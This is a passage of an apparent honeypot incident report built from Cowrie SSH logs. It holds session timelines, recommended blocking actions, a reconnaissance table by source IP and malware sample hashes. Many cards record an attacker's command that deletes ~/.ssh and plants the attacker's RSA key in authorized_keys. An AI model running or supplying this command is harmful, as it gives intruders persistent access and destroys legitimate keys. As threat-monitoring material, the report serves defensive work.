| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:58:11` | `cowrie.session.connect` |
| `2026-04-14 08:58:11` | `cowrie.client.version` |
| `2026-04-14 08:58:11` | `cowrie.client.kex` |
| `2026-04-14 08:58:11` | `cowrie.login.success` |
| `2026-04-14 08:58:12` | `cowrie.session.params` |
| `2026-04-14 08:58:12` | `cowrie.command.input` |
| `2026-04-14 08:58:12` | `cowrie.command.failed` |
| `2026-04-14 08:58:12` | `cowrie.log.closed` |
| `2026-04-14 08:58:12` | `cowrie.session.params` |
| `2026-04-14 08:58:12` | `cowrie.command.input` |
| `2026-04-14 08:58:12` | `cowrie.session.file_download` |
| `2026-04-14 08:58:12` | `cowrie.log.closed` |
| `2026-04-14 08:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebe2cb7238a

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 08:58 |
| **Last Seen** | 2026-04-14 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:58:14` | `cowrie.session.connect` |
| `2026-04-14 08:58:14` | `cowrie.client.version` |
| `2026-04-14 08:58:14` | `cowrie.client.kex` |
| `2026-04-14 08:58:15` | `cowrie.login.success` |
| `2026-04-14 08:58:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35363fa6ba65

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:58 |
| **Last Seen** | 2026-04-14 08:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:58:23` | `cowrie.session.connect` |
| `2026-04-14 08:58:23` | `cowrie.client.version` |
| `2026-04-14 08:58:23` | `cowrie.client.kex` |
| `2026-04-14 08:58:24` | `cowrie.login.success` |
| `2026-04-14 08:58:24` | `cowrie.session.params` |
| `2026-04-14 08:58:24` | `cowrie.command.input` |
| `2026-04-14 08:58:24` | `cowrie.command.failed` |
| `2026-04-14 08:58:24` | `cowrie.log.closed` |
| `2026-04-14 08:58:25` | `cowrie.session.params` |
| `2026-04-14 08:58:25` | `cowrie.command.input` |
| `2026-04-14 08:58:25` | `cowrie.session.file_download` |
| `2026-04-14 08:58:25` | `cowrie.log.closed` |
| `2026-04-14 08:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da4ba0666e2c

| Field | Detail |
|---|---|
| **Source IP** | `107.175.34[.]74` |
| **First Seen** | 2026-04-14 08:58 |
| **Last Seen** | 2026-04-14 08:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:58:28` | `cowrie.session.connect` |
| `2026-04-14 08:58:28` | `cowrie.client.version` |
| `2026-04-14 08:58:28` | `cowrie.client.kex` |
| `2026-04-14 08:58:29` | `cowrie.login.success` |
| `2026-04-14 08:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.175.34[.]74` to AbuseIPDB if not already reported
- [ ] Block `107.175.34[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896b7355fe34

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:58 |
| **Last Seen** | 2026-04-14 08:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:58:33` | `cowrie.session.connect` |
| `2026-04-14 08:58:33` | `cowrie.client.version` |
| `2026-04-14 08:58:33` | `cowrie.client.kex` |
| `2026-04-14 08:58:33` | `cowrie.login.success` |
| `2026-04-14 08:58:34` | `cowrie.session.params` |
| `2026-04-14 08:58:34` | `cowrie.command.input` |
| `2026-04-14 08:58:34` | `cowrie.command.failed` |
| `2026-04-14 08:58:34` | `cowrie.log.closed` |
| `2026-04-14 08:58:34` | `cowrie.session.params` |
| `2026-04-14 08:58:34` | `cowrie.command.input` |
| `2026-04-14 08:58:34` | `cowrie.session.file_download` |
| `2026-04-14 08:58:34` | `cowrie.log.closed` |
| `2026-04-14 08:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa98cfd9c4a7

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 08:58 |
| **Last Seen** | 2026-04-14 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 08:58:36` | `cowrie.session.connect` |
| `2026-04-14 08:58:36` | `cowrie.client.version` |
| `2026-04-14 08:58:36` | `cowrie.client.kex` |
| `2026-04-14 08:58:37` | `cowrie.login.success` |
| `2026-04-14 08:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fcba74a5627

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 09:01 |
| **Last Seen** | 2026-04-14 09:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:01:27` | `cowrie.session.connect` |
| `2026-04-14 09:01:27` | `cowrie.client.version` |
| `2026-04-14 09:01:28` | `cowrie.client.kex` |
| `2026-04-14 09:01:28` | `cowrie.login.success` |
| `2026-04-14 09:01:28` | `cowrie.session.params` |
| `2026-04-14 09:01:28` | `cowrie.command.input` |
| `2026-04-14 09:01:28` | `cowrie.command.failed` |
| `2026-04-14 09:01:29` | `cowrie.log.closed` |
| `2026-04-14 09:01:29` | `cowrie.session.params` |
| `2026-04-14 09:01:29` | `cowrie.command.input` |
| `2026-04-14 09:01:29` | `cowrie.session.file_download` |
| `2026-04-14 09:01:29` | `cowrie.log.closed` |
| `2026-04-14 09:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ea2d20f695b

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 09:01 |
| **Last Seen** | 2026-04-14 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:01:31` | `cowrie.session.connect` |
| `2026-04-14 09:01:31` | `cowrie.client.version` |
| `2026-04-14 09:01:31` | `cowrie.client.kex` |
| `2026-04-14 09:01:32` | `cowrie.login.success` |
| `2026-04-14 09:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5336cc79ae83

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 09:01 |
| **Last Seen** | 2026-04-14 09:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:01:53` | `cowrie.session.connect` |
| `2026-04-14 09:01:53` | `cowrie.client.version` |
| `2026-04-14 09:01:53` | `cowrie.client.kex` |
| `2026-04-14 09:01:54` | `cowrie.login.success` |
| `2026-04-14 09:01:54` | `cowrie.session.params` |
| `2026-04-14 09:01:54` | `cowrie.command.input` |
| `2026-04-14 09:01:54` | `cowrie.command.failed` |
| `2026-04-14 09:01:54` | `cowrie.log.closed` |
| `2026-04-14 09:01:55` | `cowrie.session.params` |
| `2026-04-14 09:01:55` | `cowrie.command.input` |
| `2026-04-14 09:01:55` | `cowrie.session.file_download` |
| `2026-04-14 09:01:55` | `cowrie.log.closed` |
| `2026-04-14 09:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9791f84b03f4

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 09:01 |
| **Last Seen** | 2026-04-14 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:01:57` | `cowrie.session.connect` |
| `2026-04-14 09:01:57` | `cowrie.client.version` |
| `2026-04-14 09:01:57` | `cowrie.client.kex` |
| `2026-04-14 09:01:57` | `cowrie.login.success` |
| `2026-04-14 09:01:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc211c06a907

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 09:03 |
| **Last Seen** | 2026-04-14 09:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:03:06` | `cowrie.session.connect` |
| `2026-04-14 09:03:06` | `cowrie.client.version` |
| `2026-04-14 09:03:07` | `cowrie.client.kex` |
| `2026-04-14 09:03:07` | `cowrie.login.success` |
| `2026-04-14 09:03:08` | `cowrie.session.params` |
| `2026-04-14 09:03:08` | `cowrie.command.input` |
| `2026-04-14 09:03:08` | `cowrie.command.failed` |
| `2026-04-14 09:03:08` | `cowrie.log.closed` |
| `2026-04-14 09:03:08` | `cowrie.session.params` |
| `2026-04-14 09:03:08` | `cowrie.command.input` |
| `2026-04-14 09:03:08` | `cowrie.session.file_download` |
| `2026-04-14 09:03:08` | `cowrie.log.closed` |
| `2026-04-14 09:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebbcca8fede9

| Field | Detail |
|---|---|
| **Source IP** | `220.118.173[.]234` |
| **First Seen** | 2026-04-14 09:03 |
| **Last Seen** | 2026-04-14 09:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:03:10` | `cowrie.session.connect` |
| `2026-04-14 09:03:10` | `cowrie.client.version` |
| `2026-04-14 09:03:10` | `cowrie.client.kex` |
| `2026-04-14 09:03:11` | `cowrie.login.success` |
| `2026-04-14 09:03:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.118.173[.]234` to AbuseIPDB if not already reported
- [ ] Block `220.118.173[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb6fef38aaa

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 09:03 |
| **Last Seen** | 2026-04-14 09:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:03:33` | `cowrie.session.connect` |
| `2026-04-14 09:03:33` | `cowrie.client.version` |
| `2026-04-14 09:03:33` | `cowrie.client.kex` |
| `2026-04-14 09:03:34` | `cowrie.login.success` |
| `2026-04-14 09:03:34` | `cowrie.session.params` |
| `2026-04-14 09:03:34` | `cowrie.command.input` |
| `2026-04-14 09:03:34` | `cowrie.command.failed` |
| `2026-04-14 09:03:35` | `cowrie.log.closed` |
| `2026-04-14 09:03:35` | `cowrie.session.params` |
| `2026-04-14 09:03:35` | `cowrie.command.input` |
| `2026-04-14 09:03:35` | `cowrie.session.file_download` |
| `2026-04-14 09:03:35` | `cowrie.log.closed` |
| `2026-04-14 09:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a0db316152e

| Field | Detail |
|---|---|
| **Source IP** | `112.217.188[.]122` |
| **First Seen** | 2026-04-14 09:03 |
| **Last Seen** | 2026-04-14 09:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 09:03:37` | `cowrie.session.connect` |
| `2026-04-14 09:03:37` | `cowrie.client.version` |
| `2026-04-14 09:03:37` | `cowrie.client.kex` |
| `2026-04-14 09:03:38` | `cowrie.login.success` |
| `2026-04-14 09:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.217.188[.]122` to AbuseIPDB if not already reported
- [ ] Block `112.217.188[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.175.34[.]74` | **25** | 2026-04-14 08:22 | 2026-04-14 08:58 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.217.188[.]122` | **25** | 2026-04-14 08:23 | 2026-04-14 09:05 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `220.118.173[.]234` | **25** | 2026-04-14 08:21 | 2026-04-14 09:03 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.123[.]16` | **24** | 2026-04-14 08:24 | 2026-04-14 08:42 | 18m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `213.225.13[.]156` | **13** | 2026-04-14 07:07 | 2026-04-14 07:25 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.241.79[.]66` | 1 | 2026-04-14 08:21 | 2026-04-14 08:22 | 60s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.147[.]81` | 1 | 2026-04-14 08:22 | 2026-04-14 08:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.176.122[.]24` | 1 | 2026-04-14 08:20 | 2026-04-14 08:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `139.19.117[.]130` | 1 | 2026-04-14 08:02 | 2026-04-14 08:02 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.117[.]77` | 1 | 2026-04-14 08:24 | 2026-04-14 08:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]113` | 1 | 2026-04-14 07:11 | 2026-04-14 07:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.231.184[.]15` | 1 | 2026-04-14 07:47 | 2026-04-14 07:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.231.191[.]10` | 1 | 2026-04-14 07:49 | 2026-04-14 07:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.108.64[.]6` | 1 | 2026-04-14 08:22 | 2026-04-14 08:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-04-14 08:06 | 2026-04-14 08:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]93` | 1 | 2026-04-14 08:49 | 2026-04-14 08:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.213.175[.]140` | 1 | 2026-04-14 08:45 | 2026-04-14 08:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.16.66[.]255` | 1 | 2026-04-14 06:29 | 2026-04-14 06:30 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
